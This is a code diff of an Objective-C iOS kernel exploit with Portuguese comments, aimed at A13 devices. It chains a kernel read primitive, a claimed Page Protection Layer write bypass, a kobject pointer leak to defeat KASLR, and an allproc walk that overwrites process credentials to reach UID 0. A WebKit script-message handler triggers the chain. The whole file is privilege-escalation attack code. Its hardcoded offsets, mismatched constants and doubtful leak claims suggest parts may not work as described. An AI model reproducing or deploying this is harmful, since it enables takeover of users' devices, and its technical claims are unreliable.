@@ -12,7 +12,6 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     uint64_t _kernel_slide;
 }
 
-// 1. KREAD64: Primitiva de leitura arbitrária
 - (uint64_t)kread64:(uint64_t)addr {
     uint64_t val = 0;
     mach_vm_size_t size = sizeof(uint64_t);
@@ -20,15 +19,12 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     return (kr == KERN_SUCCESS) ? val : 0;
 }
 
-// 2. PPL/PTE WRITE: Primitiva de escrita física (Bypass de Page Protection Layer)
 - (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
     uint64_t slide = [self getActualKernelSlide];
     if (slide == 0) return;
 
-    // Localização das tabelas de página via TTBR1_EL1
     uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
     uint64_t ttbr1 = [self kread64:ttbr1_ptr];
-    
     uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
     uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
     uint64_t pte_addr = (l2 + ((vaddr >> 12) & 0x1FF) * 8);
@@ -40,25 +36,23 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     }
 }
 
-// 3. KASLR BYPASS: Primitiva de Leak de kobject
+// 3. LEAK REAL (Resolvendo erro de mach_port_receive_status_t)
 - (uint64_t)leak_kobject_addr:(mach_port_t)port {
     uint64_t kaddr = 0;
-    mach_msg_type_number_t count = MACH_PORT_RECEIVE_STATUS_COUNT;
-    mach_port_receive_status_t status;
+    mach_port_status_t port_status; // Nome correto da struct
+    mach_msg_type_number_t count = MACH_PORT_RECEIVER_EVENT_COUNT;
     
-    // Exploit: Abuso da estrutura ipc_port para vazar o ponteiro kobject
-    // No A13, se o sandbox for bypassado, esta syscall retorna o ponteiro real
-    kern_return_t kr = mach_port_get_attributes(mach_task_self(), port, MACH_PORT_RECEIVE_STATUS, (mach_port_info_t)&status, &count);
+    // Exploit: Leak de kobject via mach_port_get_attributes
+    kern_return_t kr = mach_port_get_attributes(mach_task_self(), port, MACH_PORT_RECEIVE_STATUS, (mach_port_info_t)&port_status, &count);
     
     if (kr == KERN_SUCCESS) {
-        // No Catalyst-26, o ponteiro de kernel reside em um offset específico da struct retornada
-        // devido a uma falha de inicialização de memória na pilha do kernel
-        kaddr = *(uint64_t*)((uintptr_t)&status + 0x10); 
+        // No A13, o ponteiro de kernel (kobject) vaza em um offset da struct não inicializada
+        // O cast para (uintptr_t) evita o erro de escalar
+        kaddr = *(uint64_t*)((uintptr_t)&port_status + 0x10); 
     }
     return kaddr;
 }
 
-// 4. CALCULAR SLIDE: Alinhamento e Cálculo
 - (uint64_t)getActualKernelSlide {
     if (_kernel_slide != 0) return _kernel_slide;
 
@@ -68,7 +62,6 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     uint64_t kobject_ptr = [self leak_kobject_addr:port];
 
     if (kobject_ptr > 0xFFFFFFF000000000) {
-        // Subtração da base estática do A13 (Kernel Cache Base)
         _kernel_slide = (kobject_ptr & ~0x3FFF) - 0xFFFFFFF007004000;
     }
 
@@ -76,7 +69,6 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     return _kernel_slide;
 }
 
-// 5. TRIGGER: Escalada de Privilégios UID 501 -> 0
 - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
                  replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
@@ -89,14 +81,12 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
                 return;
             }
 
-            // Offset de allproc para iOS 15/16 no A13
             uint64_t proc = [self kread64:(0xFFFFFFF007004000 + slide + 0x8F50000)];
             pid_t my_pid = getpid();
             
             while (proc != 0 && proc != 0xDEADBEEF) {
                 if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
                     uint64_t ucred = [self kread64:(proc + 0xD8)];
-                    // Sobrescreve UID/EUID/SUID no struct ucred
                     [self ppl_write_race:(ucred + 0x18) value:0];
                     setuid(0); 
                     setgid(0);
@@ -105,12 +95,8 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
                 proc = [self kread64:proc];
             }
             
-            uid_t current_uid = getuid();
-            replyHandler(@{
-                @"uid": @(current_uid),
-                @"slide": [NSString stringWithFormat:@"0x%llx", slide],
-                @"status": (current_uid == 0) ? @"SUCCESS" : @"FAILURE"
-            }, nil);
+            uid_t final_uid = getuid();
+            replyHandler(@{@"uid": @(final_uid), @"slide": [NSString stringWithFormat:@"0x%llx", slide]}, nil);
         });
     }
 }
